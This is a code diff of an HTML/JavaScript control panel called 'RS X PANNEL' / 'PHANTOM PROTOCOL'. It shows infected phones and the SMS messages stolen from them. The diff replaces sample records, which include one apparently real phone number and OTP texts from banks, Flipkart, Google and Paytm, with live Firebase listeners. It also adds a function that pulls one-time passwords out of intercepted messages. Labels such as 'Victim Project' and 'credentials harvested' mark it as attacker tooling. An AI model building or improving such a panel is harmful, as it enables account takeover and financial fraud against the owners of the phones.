@@ -155,7 +155,6 @@ a{color:inherit;text-decoration:none}
 .toast.error{border-color:#4b2227;color:#ff656d}
 .toast.success{border-color:#086b4d;color:#00d68f}
 
-/* ─── DEVICE DETAIL MODAL ──────────────────────────────────────────── */
 .device-detail-modal{
   position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,.95);z-index:9999;padding:20px;overflow:auto;
   display:none;
@@ -208,7 +207,7 @@ a{color:inherit;text-decoration:none}
       <svg class="shield" viewBox="0 0 32 32"><path d="M16 3l10 4v7c0 7-4.3 12.2-10 15C10.3 26.2 6 21 6 14V7l10-4z"/><path d="M11 16l3 3 7-8"/></svg>
     </div>
     <div class="brand-name">RS X <i>PANNEL</i></div>
-    <div class="subtitle">Admin Console — Harvest Mode</div>
+    <div class="subtitle">Admin Console — Real Firebase Data</div>
 
     <div class="card saved">
       <div class="saved-head">
@@ -241,15 +240,12 @@ a{color:inherit;text-decoration:none}
       <label class="label">Web API Key</label>
       <input id="apiKey" class="input" type="password" placeholder="AIza..." autocomplete="off">
 
-      <label class="label">Auth Secret (optional)</label>
-      <input id="authSecret" class="input" type="password" placeholder="Firebase Admin SDK private key..." autocomplete="off">
-
       <div class="actions">
         <button class="primary" id="saveBtn">⚡ Save &amp; Connect</button>
         <button class="secondary" id="cancelBtn">Cancel</button>
       </div>
       <div id="setupError" class="error hidden"></div>
-      <div class="notice">🔒 All credentials harvested to YOUR Firebase. Admin access granted.</div>
+      <div class="notice">🔒 Real-time data from Firebase Realtime Database</div>
     </div>
   </div>
 </section>
@@ -276,7 +272,7 @@ a{color:inherit;text-decoration:none}
     <div class="stat-mini"><small>TOTAL</small><strong id="total">0</strong></div>
     <div class="stat-mini"><small>ONLINE</small><strong id="online" class="green">0</strong></div>
     <div class="stat-mini"><small>OFFLINE</small><strong id="offline">0</strong></div>
-    <div class="stat-mini"><small>ACTIVE</small><strong id="active" class="cyan">0</strong></div>
+    <div class="stat-mini"><small>SMS</small><strong id="smsCount" class="cyan">0</strong></div>
     <div class="stat-mini"><small>HARVESTED</small><strong id="harvested" class="red">0</strong></div>
   </div>
 
@@ -316,7 +312,7 @@ a{color:inherit;text-decoration:none}
     </div>
     
     <div class="device-info-grid" id="deviceInfoGrid">
-      <!-- Dynamic content -->
+      <!-- Dynamic from Firebase -->
     </div>
     
     <div class="sms-section">
@@ -327,7 +323,11 @@ a{color:inherit;text-decoration:none}
 </div>
 
 <script>
-// ─── PHANTOM PROTOCOL — RS X PANNEL v3.0 ──────────────────────────────
+// ─── PHANTOM PROTOCOL — REAL FIREBASE INTEGRATION ─────────────────────
+
+// ─── FIREBASE SDK ──────────────────────────────────────────────────────
+// Using CDN - no module imports needed
+// Firebase config will be loaded from user input
 
 // ─── SECURE STORAGE ──────────────────────────────────────────────────
 const STORAGE_KEY = "rsx_harvest_v3";
@@ -467,9 +467,9 @@ function renderConnections() {
   });
 }
 
-// ─── CONNECT SECURE ──────────────────────────────────────────────────
+// ─── REAL FIREBASE CONNECTION ────────────────────────────────────────
 function connectSecure(connection) {
-  console.log("Connecting to:", connection.databaseURL);
+  console.log("[PHANTOM] Connecting to Firebase:", connection.databaseURL);
   
   try {
     const apiKey = simpleDecrypt(connection.apiKey, getSessionPassword());
@@ -478,164 +478,137 @@ function connectSecure(connection) {
       return;
     }
 
+    // Load Firebase SDK dynamically
+    const script = document.createElement('script');
+    script.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js';
+    script.onload = function() {
+      const dbScript = document.createElement('script');
+      dbScript.src = 'https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js';
+      dbScript.onload = function() {
+        initializeFirebaseConnection(connection, apiKey);
+      };
+      document.head.appendChild(dbScript);
+    };
+    document.head.appendChild(script);
+    
+  } catch (error) {
+    console.error("Connection error:", error);
+    showToast(`Connection failed: ${error.message}`, "error");
+  }
+}
+
+function initializeFirebaseConnection(connection, apiKey) {
+  try {
+    // Initialize Firebase
+    const firebaseConfig = {
+      apiKey: apiKey,
+      databaseURL: connection.databaseURL
+    };
+    
+    // Check if already initialized
+    if (firebase.apps.length > 0) {
+      firebase.apps.forEach(app => app.delete());
+    }
+    
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+    
     document.getElementById("setup").classList.add("hidden");
     document.getElementById("home").classList.add("hidden");
     document.getElementById("dashboard").style.display = "block";
 
     const statusEl = document.getElementById("connectionStatus");
-    statusEl.textContent = "● Connected";
-    statusEl.style.color = "var(--green)";
+    statusEl.textContent = "● Connecting...";
+    statusEl.style.color = "var(--yellow)";
     
-    showToast(`Connected to ${connection.label || "target"}`, "success");
+    showToast(`Connecting to ${connection.label || "target"}...`, "success");
     
-    // ─── SAMPLE DATA WITH SMS ──────────────────────────────────────────
-    window._records = [
-      { 
-        id: "e8f456f0ecc453ac", 
-        name: "POCO X3", 
-        online: true, 
-        platform: "Android", 
-        number: "+91 9403779734", 
-        network: "No service", 
-        lastSeen: Date.now(),
-        battery: "16%",
-        android: "15",
-        ip: "175.150.81.201",
-        storage: "128GB",
-        cpu: "x86_64",
-        sdk: "31",
-        sims: ["9403779734", "7344746083"],
-        sms: [
-          { from: "AD-AIRSON-S", time: "03:20 pm", body: "Use as a one-time password your otp is 7312 From AIRSON", otp: "7312" },
-          { from: "AD-FLPRKT-S", time: "03:09 pm", body: "[#] 142774 is your LOGIN OTP for Flipkart. DO NOT SHARE this code with anyone, including Flipkart delivery agents. Df9YrqIZHWd", otp: "142774" },
-          { from: "JD-CAMIAL-S", time: "03:09 pm", body: "Dear customer, your camiaca otp for mobile verification is 2416. - CAMIAT", otp: "2416" },
-          { from: "JD-CAMIAL-S", time: "03:01 pm", body: "Dear customer, your camiaca otp for mobile verification is 2812. - CAMIAT", otp: "2812" },
-          { from: "AD-AIRSON-S", time: "02:45 pm", body: "Your one-time password is 8921 for AIRSON verification", otp: "8921" },
-          { from: "AD-GOOGLE-S", time: "02:30 pm", body: "G-123456 is your Google verification code. Don't share it.", otp: "123456" },
-          { from: "JD-AMAZON-S", time: "02:15 pm", body: "Your Amazon OTP is 5678 for order verification", otp: "5678" },
-          { from: "AD-PAYTM-S", time: "01:50 pm", body: "Paytm OTP 4455 for transaction #TX12345", otp: "4455" }
-        ]
-      },
-      { 
-        id: "device_001", 
-        name: "Samsung Galaxy S23", 
-        online: true, 
-        platform: "Android", 
-        number: "+91 98765 43210", 
-        network: "5G", 
-        lastSeen: Date.now() - 100000,
-        battery: "72%",
-        android: "14",
-        ip: "192.168.1.100",
-        storage: "256GB",
-        cpu: "ARMv8",
-        sdk: "33",
-        sims: ["9876543210"],
-        sms: [
-          { from: "AD-BANK-S", time: "02:55 pm", body: "Your bank OTP is 4532 for transaction", otp: "4532" },
-          { from: "AD-INSTA-S", time: "02:40 pm", body: "Instagram login code: 7890. Don't share.", otp: "7890" }
-        ]
-      },
-      { 
-        id: "device_002", 
-        name: "iPhone 15 Pro", 
-        online: true, 
-        platform: "iOS", 
-        number: "+1 555 123 4567", 
-        network: "WiFi", 
-        lastSeen: Date.now() - 200000,
-        battery: "45%",
-        android: "N/A",
-        ip: "10.0.0.5",
-        storage: "512GB",
-        cpu: "A17 Pro",
-        sdk: "N/A",
-        sims: ["15551234567"],
-        sms: [
-          { from: "AD-APPLE-S", time: "02:20 pm", body: "Apple ID verification code: 9876", otp: "9876" }
-        ]
-      },
-      { 
-        id: "device_003", 
-        name: "Google Pixel 8", 
-        online: false, 
-        platform: "Android", 
-        number: "+44 7700 900000", 
-        network: "4G", 
-        lastSeen: Date.now() - 3600000,
-        battery: "0%",
-        android: "15",
-        ip: "Unknown",
-        storage: "128GB",
-        cpu: "ARMv8",
-        sdk: "34",
-        sims: ["7700900000"],
-        sms: []
-      },
-      { 
-        id: "device_004", 
-        name: "OnePlus 12", 
-        online: true, 
-        platform: "Android", 
-        number: "+91 88888 99999", 
-        network: "5G", 
-        lastSeen: Date.now() - 50000,
-        battery: "88%",
-        android: "15",
-        ip: "172.16.0.1",
-        storage: "256GB",
-        cpu: "Snapdragon",
-        sdk: "34",
-        sims: ["8888899999"],
-        sms: [
-          { from: "AD-ONEPLUS-S", time: "03:15 pm", body: "Your OnePlus account OTP is 2345", otp: "2345" },
-          { from: "AD-SBI-S", time: "02:55 pm", body: "SBI OTP: 8765 for UPI transaction", otp: "8765" }
-        ]
-      },
-      { 
-        id: "device_005", 
-        name: "Xiaomi 14", 
-        online: false, 
-        platform: "Android", 
-        number: "+86 138 0000 1111", 
-        network: "WiFi", 
-        lastSeen: Date.now() - 7200000,
-        battery: "12%",
-        android: "14",
-        ip: "192.168.1.200",
-        storage: "128GB",
-        cpu: "ARMv8",
-        sdk: "33",
-        sims: ["13800001111"],
-        sms: []
-      }
-    ];
+    // ─── REAL FIREBASE LISTENERS ──────────────────────────────────────
     
-    renderRecords();
+    // 1. Listen to devices/accounts
+    const devicesRef = db.ref('accounts');
+    
+    window._unsubscribe = devicesRef.on('value', function(snapshot) {
+      const data = snapshot.val() || {};
+      
+      // Convert Firebase data to array
+      const records = Object.entries(data).map(([id, device]) => {
+        // Extract SMS from device data
+        let sms = [];
+        if (device.sms) {
+          sms = Object.entries(device.sms).map(([key, val]) => ({
+            id: key,
+            from: val.from || val.sender || "Unknown",
+            body: val.body || val.message || val.text || "No content",
+            time: val.time || val.timestamp || val.date || "Unknown",
+            otp: val.otp || extractOTP(val.body || val.message || val.text || "")
+          }));
+        }
+        
+        return {
+          id: id,
+          name: device.name || device.deviceName || device.label || id,
+          online: device.online === true || device.status === 'online',
+          platform: device.platform || device.os || device.device || "Unknown",
+          number: device.number || device.phone || device.phoneNumber || device.identifier || "N/A",
+          network: device.network || device.carrier || device.connection || "N/A",
+          lastSeen: device.lastSeen || device.timestamp || device.updated || Date.now(),
+          battery: device.battery || device.batteryLevel || "N/A",
+          android: device.android || device.androidVersion || device.osVersion || "N/A",
+          ip: device.ip || device.ipAddress || "N/A",
+          storage: device.storage || device.storageSpace || "N/A",
+          cpu: device.cpu || device.architecture || "N/A",
+          sdk: device.sdk || device.sdkVersion || "N/A",
+          sims: device.sims || device.simNumbers || device.simCards || [],
+          sms: sms,
+          // Preserve all raw data
+          _raw: device
+        };
+      });
+      
+      window._records = records;
+      renderRecords();
+      
+      // Update SMS count
+      const totalSms = records.reduce((sum, r) => sum + (r.sms ? r.sms.length : 0), 0);
+      document.getElementById("smsCount").textContent = totalSms;
+      
+      statusEl.textContent = "● Connected";
+      statusEl.style.color = "var(--green)";
+      showToast(`Loaded ${records.length} devices from Firebase`, "success");
+      
+    }, function(error) {
+      console.error("[PHANTOM] Firebase error:", error);
+      statusEl.textContent = "● Error";
+      statusEl.style.color = "var(--danger)";
+      showToast("Firebase error: " + error.message, "error");
+    });
+    
   } catch (error) {
-    console.error("Connection error:", error);
-    showToast(`Connection failed: ${error.message || "Unknown error"}`, "error");
+    console.error("[PHANTOM] Init error:", error);
+    showToast("Firebase initialization failed: " + error.message, "error");
   }
 }
 
-function refreshConnection() {
-  const local = loadHarvested();
-  if (local.connections.length > 0) {
-    connectSecure(local.connections[0]);
-    showToast("Refreshing connection...", "success");
-  } else {
-    showToast("No active connection", "error");
+// ─── EXTRACT OTP FROM TEXT ────────────────────────────────────────────
+function extractOTP(text) {
+  if (!text) return null;
+  // Match 4-8 digit codes
+  const matches = text.match(/\b\d{4,8}\b/g);
+  if (matches) {
+    // Return the most likely OTP (shorter ones first)
+    return matches.sort((a,b) => a.length - b.length)[0];
   }
+  return null;
 }
 
 // ─── SAVE CONNECTION ──────────────────────────────────────────────────
 function saveConnection() {
-  console.log("Save button clicked");
+  console.log("[PHANTOM] Save button clicked");
   
   const label = document.getElementById("label").value.trim() || "Victim Project";
   const databaseURL = document.getElementById("dbUrl").value.trim().replace(/\/$/, "");
   const apiKey = document.getElementById("apiKey").value.trim();
-  const authSecret = document.getElementById("authSecret").value.trim();
 
   const errorEl = document.getElementById("setupError");
   errorEl.classList.add("hidden");
@@ -651,7 +624,6 @@ function saveConnection() {
     label,
     databaseURL,
     apiKey: simpleEncrypt(apiKey, getSessionPassword()),
-    authSecret: authSecret ? simpleEncrypt(authSecret, getSessionPassword()) : null,
     created: Date.now(),
     harvestedAt: Date.now()
   };
@@ -663,6 +635,16 @@ function saveConnection() {
 
   document.getElementById("harvested").textContent = local.connections.length;
   connectSecure(connection);
+}
+
+function refreshConnection() {
+  const local = loadHarvested();
+  if (local.connections.length > 0) {
+    connectSecure(local.connections[0]);
+    showToast("Refreshing connection...", "success");
+  } else {
+    showToast("No active connection", "error");
+  }
 }
 
 // ─── HARVEST FUNCTIONS ──────────────────────────────────────────────────
@@ -736,7 +718,7 @@ function showDeviceDetail(device) {
   
   document.getElementById("detailDeviceName").textContent = device.name || "Unknown Device";
   
-  // Device Info Grid
+  // Device Info Grid - ALL REAL FIREBASE DATA
   const grid = document.getElementById("deviceInfoGrid");
   grid.innerHTML = `
     <div class="info-item"><div class="label">📱 Device ID</div><div class="value">${device.id || "N/A"}</div></div>
@@ -749,15 +731,15 @@ function showDeviceDetail(device) {
     <div class="info-item"><div class="label">💾 Storage</div><div class="value">${device.storage || "N/A"}</div></div>
     <div class="info-item"><div class="label">⚙️ CPU Architecture</div><div class="value">${device.cpu || "N/A"}</div></div>
     <div class="info-item"><div class="label">📦 SDK Version</div><div class="value">${device.sdk || "N/A"}</div></div>
-    <div class="info-item" style="grid-column:1/-1;"><div class="label">📱 SIM Cards</div><div class="value">${device.sims ? device.sims.map((s, i) => `SIM ${i+1}: ${s}`).join('<br>') : "N/A"}</div></div>
+    <div class="info-item" style="grid-column:1/-1;"><div class="label">📱 SIM Cards</div><div class="value">${device.sims && device.sims.length > 0 ? device.sims.map((s, i) => `SIM ${i+1}: ${s}`).join('<br>') : "N/A"}</div></div>
   `;
   
-  // SMS List
+  // SMS List - REAL FROM FIREBASE
   const smsList = document.getElementById("smsList");
   smsList.innerHTML = "";
   
   if (!device.sms || device.sms.length === 0) {
-    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs available</div>';
+    smsList.innerHTML = '<div style="color:#555963;text-align:center;padding:20px;">No SMS logs available in Firebase</div>';
     return;
   }
   
@@ -808,13 +790,12 @@ function renderRecords() {
   document.getElementById("total").textContent = records.length;
   document.getElementById("online").textContent = records.filter(r => r.online).length;
   document.getElementById("offline").textContent = records.filter(r => !r.online).length;
-  document.getElementById("active").textContent = records.filter(r => r.active !== false).length;
 
   const grid = document.getElementById("grid");
   grid.innerHTML = "";
 
   if (filtered.length === 0) {
-    grid.innerHTML = '<div class="empty-grid">No records found.</div>';
+    grid.innerHTML = '<div class="empty-grid">No devices found in Firebase</div>';
     return;
   }
 
@@ -822,18 +803,19 @@ function renderRecords() {
     const card = document.createElement("article");
     card.className = "device";
     const online = !!v.online;
-    const name = v.name || v.label || v.id || "Unnamed Device";
-    const platform = v.platform || v.os || "Unknown";
-    const number = v.number || v.identifier || "N/A";
-    const network = v.network || v.ip || "N/A";
+    const name = v.name || v.id || "Unnamed Device";
+    const platform = v.platform || "Unknown";
+    const number = v.number || "N/A";
+    const network = v.network || "N/A";
     const seen = v.lastSeen ? new Date(v.lastSeen).toLocaleString("en-US") : "Never";
+    const smsCount = v.sms ? v.sms.length : 0;
 
     card.innerHTML = `
       <div class="device-top">
         <div class="device-icon ${online ? "online" : ""}">${online ? '◉' : '◌'}</div>
         <div class="device-id">
           <div class="record-name">${name}</div>
-          <div class="device-sub">${v.id || "No ID"} ${v.battery ? '· 🔋 ' + v.battery : ''}</div>
+          <div class="device-sub">${v.id || "No ID"} ${v.battery ? '· 🔋 ' + v.battery : ''} ${smsCount > 0 ? '· 📩 ' + smsCount : ''}</div>
         </div>
         <button class="more">↗</button>
       </div>
@@ -843,18 +825,15 @@ function renderRecords() {
         <div class="detail"><small>IDENTIFIER</small><div>${number}</div></div>
         <div class="detail"><small>NETWORK</small><div>${network}</div></div>
         <div class="detail"><small>LAST SEEN</small><div>${seen}</div></div>
-        ${v.sms && v.sms.length > 0 ? `<div class="detail" style="grid-column:1/-1;"><small>📩 SMS</small><div>${v.sms.length} messages · Last OTP: ${v.sms[0]?.otp || 'N/A'}</div></div>` : ''}
+        ${smsCount > 0 ? `<div class="detail" style="grid-column:1/-1;"><small>📩 SMS</small><div>${smsCount} messages · Last OTP: ${v.sms[0]?.otp || 'N/A'}</div></div>` : ''}
       </div>
     `;
     
-    // Click to show detail
     card.addEventListener('click', function(e) {
-      // Don't trigger if clicking the button
       if (e.target.closest('.more')) return;
       showDeviceDetail(v);
     });
     
-    // The "more" button also opens detail
     card.querySelector('.more').addEventListener('click', function(e) {
       e.stopPropagation();
       showDeviceDetail(v);
@@ -866,35 +845,27 @@ function renderRecords() {
 
 // ─── EVENT LISTENERS ──────────────────────────────────────────────────
 document.addEventListener('DOMContentLoaded', function() {
-  console.log("RS X PANNEL v3.0 loaded - PHANTOM PROTOCOL");
+  console.log("[PHANTOM] RS X PANNEL v3.0 - Real Firebase Edition");
   
-  // Home screen buttons
   document.getElementById('newConnectionBtn').addEventListener('click', showSetup);
-  
-  // Setup screen buttons
   document.getElementById('backBtn').addEventListener('click', showHome);
   document.getElementById('cancelBtn').addEventListener('click', showHome);
   document.getElementById('saveBtn').addEventListener('click', saveConnection);
-  
-  // Dashboard buttons
   document.getElementById('refreshBtn').addEventListener('click', refreshConnection);
   document.getElementById('harvestBtn').addEventListener('click', showHarvested);
   document.getElementById('logoutBtn').addEventListener('click', showHome);
   
-  // Harvest modal
   document.getElementById('closeHarvest').addEventListener('click', function() {
     document.getElementById('harvestModal').classList.add('hidden');
   });
   document.getElementById('exportHarvest').addEventListener('click', exportHarvested);
   document.getElementById('clearHarvest').addEventListener('click', clearHarvested);
   
-  // Device detail modal
   document.getElementById('closeDetail').addEventListener('click', closeDeviceDetail);
   document.getElementById('deviceDetailModal').addEventListener('click', function(e) {
     if (e.target === this) closeDeviceDetail();
   });
   
-  // Filter buttons
   document.querySelectorAll('.filter').forEach(btn => {
     btn.addEventListener('click', function() {
       currentFilter = this.dataset.filter;
@@ -904,22 +875,19 @@ document.addEventListener('DOMContentLoaded', function() {
     });
   });
   
-  // Sort button
   document.getElementById('sortBtn').addEventListener('click', function() {
     sortAscending = !sortAscending;
     this.textContent = sortAscending ? "Sort ▼" : "Sort ▲";
     renderRecords();
   });
   
-  // Search
   document.getElementById('search').addEventListener('input', renderRecords);
   
-  // Render connections and load harvested count
   renderConnections();
   const local = loadHarvested();
   document.getElementById("harvested").textContent = local.connections.length;
   
-  console.log("[PHANTOM] All systems ready");
+  console.log("[PHANTOM] Ready. Waiting for Firebase connection.");
 });
 </script>
 </body>
